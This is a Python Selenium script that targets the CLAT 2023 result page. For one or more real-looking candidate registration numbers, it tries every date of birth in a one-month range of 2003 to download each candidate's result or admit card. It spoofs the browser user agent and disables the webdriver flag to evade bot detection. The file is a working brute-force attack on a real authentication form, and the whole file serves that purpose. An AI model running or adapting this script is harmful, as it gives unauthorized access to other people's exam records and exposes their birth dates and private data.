import datetime
import time
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.action_chains import ActionChains

options = Options()
options.headless = False

profile = webdriver.FirefoxProfile()
driver = webdriver.Firefox(options=options, firefox_profile=profile)
profile.set_preference("dom.webdriver.enabled", False)
profile.set_preference("useAutomationExtension", False)
profile.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36")

def block_element(element_id):
    # Execute JavaScript to disable or hide the element
    script = f"document.getElementById('{element_id}').style.display = 'none';"
    driver.execute_script(script)

def generate_dates(start_date, end_date):
    dates = []
    current_date = start_date
    while current_date <= end_date:
        dates.append(current_date.strftime('%d-%m-%Y'))
        current_date += datetime.timedelta(days=1)
    return dates

def download_admit_card(candidate_number, date_of_birth):
    driver.get('https://consortiumofnlus.ac.in/clat-2023/view-result.html')  # Replace with the actual URL of the website

    number_field = driver.find_element("id",'registration_number')
    number_field.send_keys(candidate_number)

    dob_field = driver.find_element("id",'dob')
    dob_field.send_keys(date_of_birth)
    
    block_element('ui-datepicker-div')

    submit_button = driver.find_element("id",'btn_download')
    submit_button.click()

    confirm_button = driver.find_element("id",'button-0')
    confirm_button.click()

    #time.sleep(1)

def download_admit_cards(candidate_numbers, start_date, end_date):
    dob_list = generate_dates(start_date, end_date)

    for candidate_number in candidate_numbers:
        print("download --1")
        x=0
        for dob in dob_list:
            x=x+1
            print(dob)
            download_admit_card(candidate_number, dob)
            print(x)

#candidate_numbers = ['128011109', '160111017', '114021354', '115021288', '109021108']  # Example list of candidate numbers
candidate_numbers = ['181011148']
start_date = datetime.date(2003, 4, 4)
end_date = datetime.date(2003, 5, 5)

download_admit_cards(candidate_numbers, start_date, end_date)

driver.quit()
